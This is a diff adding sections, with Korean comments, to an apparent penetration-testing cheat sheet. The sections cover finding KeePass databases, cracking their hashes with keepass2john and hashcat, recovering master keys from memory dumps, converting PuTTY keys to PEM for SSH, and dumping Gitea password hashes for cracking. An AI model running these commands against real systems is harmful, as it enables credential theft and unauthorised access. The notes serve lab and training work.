@@ -879,3 +879,64 @@ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
 <img width="612" height="389" alt="image" src="https://github.com/user-attachments/assets/0e6f5184-851c-460a-a00a-40dd9b3e0495" />
   
 </details>
+
+---
+<details>
+  <summary><strong>KeePass</strong></summary>
+
+### 파일 찾기
+```powershell
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+```
+- C 드라이브 전체에서 `.kdbx` 확장자를 가진 파일을 재귀적으로 검색
+- `-ErrorAction SilentlyContinue` 옵션은 접근 권한 오류 메시지를 숨김
+
+### 해시 추출 및 크래킹
+```bash
+keepass2john Database.kdbx > keepass.hash
+```
+
+```bash
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+```
+
+```
+# Master password로 로그인
+```
+
+---
+
+## KeePass Dump File Cracking
+```bash
+python3 poc.py <file.dmp>
+
+# sudo apt install keepassxc
+keepassxc <file.kdbx>
+```
+- https://github.com/matro7sh/keepass-dump-masterkey
+
+</details>
+
+---
+<details>
+  <summary><strong>PPK (PuTTY Private Key File) to PEM</strong></summary>
+
+```bash
+puttygen <file.ppk> -O private-openssh -o <file.pem>
+
+ssh -i <file.pem> host@local
+```
+  
+</details>
+
+---
+<details>
+  <summary><strong>pbkdf2(GITEA)</strong></summary>
+
+- `Hashcat`의 `PBKDF2-HMAC-SHA256` 모드(-m 10900)가 `Base64` 형식을 요구
+- `username:sha256:iterations:base64_salt:base64_digest`
+```bash
+sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
+```
+
+</details>
